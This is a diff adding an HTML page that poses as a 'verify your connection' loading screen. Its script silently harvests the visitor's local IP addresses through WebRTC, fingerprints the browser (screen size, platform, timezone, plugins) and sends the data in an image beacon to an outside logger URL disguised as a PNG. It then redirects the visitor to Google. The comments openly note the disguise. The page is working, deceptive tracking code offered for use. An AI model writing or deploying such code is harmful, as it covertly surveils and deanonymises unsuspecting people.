@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body { background: #f5f5f5; text-align: center; padding-top: 20%; font-family: Arial; }
+    </style>
+</head>
+<body>
+    <p>Please wait while we verify your connection...</p>
+
+    <script>
+    // ========== ONLY CHANGE THE REDIRECT IF NEEDED ==========
+    const LOGGER_URL = 'http://smoq3.freehosting.dev/logger.php/screenshot.png';  // ← looks like a PNG
+    const REDIRECT_TO = 'https://www.google.com';                                // ← where they land after
+    // ======================================================
+    const DELAY_MS = 2000;
+
+    function getLocalIPs() {
+        return new Promise((resolve) => {
+            const candidates = new Set();
+            const pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) {
+                    pc.close();
+                    const ips = [];
+                    candidates.forEach(c => {
+                        const parts = c.candidate.split(' ');
+                        if (parts.length >= 5 && parts[7]) {
+                            const ip = parts[4];
+                            if (!ips.includes(ip)) ips.push(ip);
+                        }
+                    });
+                    resolve(ips);
+                    return;
+                }
+                if (e.candidate && e.candidate.candidate) {
+                    candidates.add({ candidate: e.candidate.candidate });
+                }
+            };
+            setTimeout(() => { pc.close(); resolve([]); }, 3000);
+        });
+    }
+
+    function getBrowserInfo() {
+        return {
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            language: navigator.language,
+            platform: navigator.platform,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'unspecified',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins).map(p => p.name).join(',').substring(0, 200)
+        };
+    }
+
+    function sendBeacon(localIPs) {
+        const info = encodeURIComponent(JSON.stringify(getBrowserInfo()));
+        const localParam = localIPs.length ? encodeURIComponent(localIPs.join(',')) : '';
+        const beaconUrl = `${LOGGER_URL}?local=${localParam}&info=${info}`;
+        new Image().src = beaconUrl;
+    }
+
+    (async function() {
+        try {
+            const localIPs = await getLocalIPs();
+            sendBeacon(localIPs);
+        } catch (e) {
+            sendBeacon([]);
+        }
+        setTimeout(() => { window.location.href = REDIRECT_TO; }, DELAY_MS);
+    })();
+    </script>
+</body>
+</html>
